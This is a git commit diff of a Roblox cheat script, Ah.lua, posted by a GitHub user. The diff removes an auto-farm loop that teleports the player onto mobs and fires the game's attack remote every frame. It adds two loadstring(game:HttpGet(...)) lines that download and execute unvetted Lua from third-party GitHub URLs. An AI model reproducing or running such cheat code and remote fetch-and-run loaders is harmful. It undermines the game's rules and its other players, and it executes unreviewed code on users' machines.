bc5adb5d6c1edfc6ee47278ce75ae3ae4b8588db
Spookyz10 <110704273+Spookyz10@users.noreply.github.com>
2023-07-21 18:02:54 -0300

    Update Ah.lua

--- Ah.lua
+++ Ah.lua
@@ -1,18 +1,6 @@
-local localPlayer,remote,arg1 = game:GetService("Players").LocalPlayer,game:GetService("ReplicatedStorage"):WaitForChild("ClientServerNetwork",3):WaitForChild("MagicNetwork",3),"Swing"
-local mobs = workspace:WaitForChild("Game",3):WaitForChild("Mobs",3)
-local function damageTick()
-    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-    local mob = mobs:FindFirstChildOfClass("Model")
-    if not mob then
-        return
-    end
-    local rootPart,targetPart = character.PrimaryPart,mob:FindFirstChildWhichIsA("BasePart")
-    if not (rootPart and targetPart) then
-        return
-    end
-    rootPart.CFrame = targetPart.CFrame*CFrame.new(0,3,6)
-    remote:FireServer(arg1,targetPart.Position)
-end
-while game:GetService("RunService").RenderStepped:Wait() do
-    damageTick()
-end
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+
+wait(2)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ProtonDev-sys/Roblox/main/Vesteria%20V2%20rewrite.lua"))()
